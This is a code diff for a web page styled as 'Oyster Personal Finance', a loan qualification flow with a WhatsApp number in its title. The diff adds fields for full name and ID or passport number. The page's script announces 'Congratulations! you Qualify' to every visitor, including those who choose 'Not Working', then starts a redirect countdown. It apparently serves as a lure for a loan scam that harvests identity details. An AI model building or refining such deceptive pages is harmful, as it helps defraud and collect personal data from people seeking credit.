@@ -5,10 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>W.A 0707356707 Oyster | NCR 11356</title>
     
-    <!-- Professional Typography -->
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
     
-    <!-- Animation Engines -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
 
@@ -47,7 +45,6 @@
             pointer-events: none;
         }
 
-        /* UI Layer */
         .wrapper {
             position: relative;
             z-index: 10;
@@ -58,7 +55,6 @@
             padding: 20px;
         }
 
-        /* Neat Card System */
         .card {
             background: var(--card-bg);
             backdrop-filter: blur(25px);
@@ -127,6 +123,7 @@
             font-weight: 600;
             font-size: 1rem;
             color: var(--text-dim);
+            text-align: left;
         }
 
         .option-item:hover {
@@ -136,10 +133,50 @@
         }
 
         .option-item.selected {
-            background: var(--primary);
-            color: #000;
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
             border-color: var(--primary);
-            transform: translateX(5px);
+        }
+
+        /* Inputs */
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--primary);
+            margin-bottom: 5px;
+            margin-left: 5px;
+        }
+
+        input[type="text"], input[type="number"] {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 14px;
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        input:focus {
+            border-color: var(--primary);
+        }
+
+        .dynamic-input {
+            display: none;
+            margin-top: 12px;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         /* Action Button */
@@ -159,11 +196,8 @@
             transition: all 0.3s ease;
         }
 
-        .btn-next:active {
-            transform: scale(0.98);
-        }
+        .btn-next:active { transform: scale(0.98); }
 
-        /* Highlight Boxes */
         .promo-box {
             background: rgba(0, 255, 136, 0.05);
             border: 1px dashed var(--primary);
@@ -180,7 +214,6 @@
             text-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
         }
 
-        /* Redirect Timer */
         #redirect-timer {
             position: fixed;
             bottom: 30px;
@@ -194,7 +227,6 @@
             display: none;
         }
 
-        /* Loader Animation */
         .loader {
             width: 40px;
             height: 40px;
@@ -220,73 +252,95 @@
 
     <div class="wrapper">
         
-        <!-- STEP 1: WELCOME -->
         <div class="card active" id="step1">
             <span class="ncr-badge">NCR 11356</span>
             <h1>Welcome to Oyster Personal Finance</h1>
-            <p>With Oyster you can Get Instant Finance you need now with simple step below check if you can qualify when you apply for a Loan with Us</p>
+            <p>Get the Instant Finance you need today. Follow the simple steps below to check your qualification.</p>
             <div class="promo-box">
                 <div class="amount-hero">Instant Pay out</div>
                 <div style="font-size: 0.8rem; color: var(--primary);">MAXIMUM FACILITY</div>
             </div>
-            <p>Get instant feedback To check for Qualification.</p>
+            <p>Click below to begin.</p>
             <button class="btn-next" onclick="nextStep(2)">Check Qualification</button>
         </div>
 
-        <!-- STEP 2: LOAN AMOUNT -->
         <div class="card" id="step2">
+            <h1>Personal Details</h1>
+            <p>Please enter your identification details to proceed.</p>
+            <div class="input-group">
+                <label>Full Name</label>
+                <input type="text" id="user-name" placeholder="Enter Full Name">
+            </div>
+            <div class="input-group">
+                <label>ID / Passport Number</label>
+                <input type="text" id="user-id" placeholder="Enter ID Number">
+            </div>
+            <button class="btn-next" onclick="validateStep2()">Continue</button>
+        </div>
+
+        <div class="card" id="step3">
             <h1>Loan Required</h1>
             <p>Select the amount you wish to apply for today.</p>
             <div class="selection-list">
-                <div class="option-item" onclick="pickAmount('R10,000 - R30,000', this)">Between R10,000 — R30,000</div>
+                <div class="option-item" onclick="pickAmount('R8,000 - R30,000', this)">Between R8,000 — R30,000</div>
                 <div class="option-item" onclick="pickAmount('R30,000 - R70,000', this)">Between R30,000 — R70,000</div>
                 <div class="option-item" onclick="pickAmount('R70,000 - R150,000', this)">Between R70,000 — R150,000</div>
-                <div class="option-item" onclick="pickAmount('R150,000 - R400,000', this)">Between R150,000 — R400,000 or more</div>
+                <div class="option-item" onclick="pickAmount('R150,000 - R400,000', this)">R150,000 — R400,000 or more</div>
             </div>
-            <button class="btn-next" onclick="nextStep(3)">Continue</button>
+            <button class="btn-next" onclick="nextStep(4)">Continue</button>
         </div>
 
-        <!-- STEP 3: EMPLOYMENT -->
-        <div class="card" id="step3">
+        <div class="card" id="step4">
             <h1>Employment Status</h1>
-            <p>To finalize your qualification, confirm your current work status.</p>
+            <p>Confirm your current work status and income details.</p>
             <div class="selection-list">
-                <div class="option-item" onclick="pickStatus('Permanently Employed', this)">Employed</div>
-                <div class="option-item" onclick="pickStatus('Self Employed', this)">Self Employed</div>
-                <div class="option-item" onclick="pickStatus('Employed', this)">Contract / Employed</div>
-                <div class="option-item" onclick="pickStatus('Not Employed', this)">Not Employed</div>
+                <div class="option-item" onclick="pickStatus('Employed', this)">
+                    Employed / Contract
+                    <div class="dynamic-input" id="input-employed">
+                        <input type="text" placeholder="Monthly Income (e.g. R15,000)" onclick="event.stopPropagation()">
+                    </div>
+                </div>
+                <div class="option-item" onclick="pickStatus('Self Employed', this)">
+                    Self Employed
+                    <div class="dynamic-input" id="input-self">
+                        <input type="text" placeholder="Average Monthly Income" onclick="event.stopPropagation()">
+                    </div>
+                </div>
+                <div class="option-item" onclick="pickStatus('Not Employed', this)">
+                    Not Working / Other
+                    <div class="dynamic-input" id="input-none">
+                        <input type="text" placeholder="How will you pay installments?" onclick="event.stopPropagation()">
+                    </div>
+                </div>
             </div>
             <button class="btn-next" onclick="processFinal()">Verify Now</button>
         </div>
 
-        <!-- STEP 4: CONGRATULATIONS -->
-        <div class="card" id="step4">
+        <div class="card" id="step5">
             <div class="ncr-badge">QUALIFICATION SECURED</div>
             <h1 style="color: var(--primary);">Congratulations!</h1>
-            <p>The Oyster Personal Finance Team has confirmed that you Qualify to apply for:</p>
+            <p id="congrats-text">User, you Qualify to apply for:</p>
             <div class="amount-hero" id="display-amount">R0.00</div>
             <p>We are now preparing your application Form. Please do not close this window.</p>
             <div class="loader"></div>
-            <div style="font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary);">Secure Link Generating To apply Now</div>
+            <div style="font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary);">Secure Link Generating...</div>
         </div>
 
     </div>
 
     <script>
-        // --- 3D SCENE (Web3 Styles) ---
+        // --- 3D BACKGROUND ---
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
         renderer.setSize(window.innerWidth, window.innerHeight);
         document.getElementById('canvas-container').appendChild(renderer.domElement);
 
-        // Geometry: A Digital Finance Grid
         const gridGeo = new THREE.IcosahedronGeometry(15, 1);
         const gridMat = new THREE.MeshBasicMaterial({ color: 0x00ff88, wireframe: true, transparent: true, opacity: 0.1 });
         const sphere = new THREE.Mesh(gridGeo, gridMat);
         scene.add(sphere);
 
-        // Floating particles
         const pCount = 800;
         const pGeo = new THREE.BufferGeometry();
         const pPos = new Float32Array(pCount * 3);
@@ -301,13 +355,11 @@
         function animate() {
             requestAnimationFrame(animate);
             sphere.rotation.y += 0.002;
-            sphere.rotation.x += 0.001;
             points.rotation.y -= 0.001;
             renderer.render(scene, camera);
         }
         animate();
 
-        // Responsive resize
         window.addEventListener('resize', () => {
             camera.aspect = window.innerWidth / window.innerHeight;
             camera.updateProjectionMatrix();
@@ -328,25 +380,45 @@
             }});
         }
 
+        function validateStep2() {
+            const name = document.getElementById('user-name').value;
+            const id = document.getElementById('user-id').value;
+            if(name && id) {
+                localStorage.setItem('oyster_name', name);
+                nextStep(3);
+            } else {
+                alert("Please fill in your details to continue.");
+            }
+        }
+
         function pickAmount(val, el) {
             localStorage.setItem('oyster_amt', val);
-            document.querySelectorAll('#step2 .option-item').forEach(i => i.classList.remove('selected'));
+            document.querySelectorAll('#step3 .option-item').forEach(i => i.classList.remove('selected'));
             el.classList.add('selected');
         }
 
         function pickStatus(val, el) {
             localStorage.setItem('oyster_status', val);
-            document.querySelectorAll('#step3 .option-item').forEach(i => i.classList.remove('selected'));
+            
+            // UI Selection
+            document.querySelectorAll('#step4 .option-item').forEach(i => i.classList.remove('selected'));
             el.classList.add('selected');
+
+            // Toggle Inputs
+            document.querySelectorAll('.dynamic-input').forEach(di => di.style.display = 'none');
+            const innerInput = el.querySelector('.dynamic-input');
+            if(innerInput) innerInput.style.display = 'block';
         }
 
         function processFinal() {
-            const finalAmt = localStorage.getItem('oyster_amt') || "R10,000";
-            document.getElementById('display-amount').innerText = finalAmt;
+            const finalAmt = localStorage.getItem('oyster_amt') || "R8,000";
+            const userName = localStorage.getItem('oyster_name') || "Customer";
             
-            nextStep(4);
+            document.getElementById('display-amount').innerText = finalAmt;
+            document.getElementById('congrats-text').innerText = userName + ", you Qualify to apply for:";
+            
+            nextStep(5);
 
-            // Start Countdown
             const timerEl = document.getElementById('redirect-timer');
             timerEl.style.display = 'block';
             gsap.from(timerEl, { y: 50, opacity: 0 });
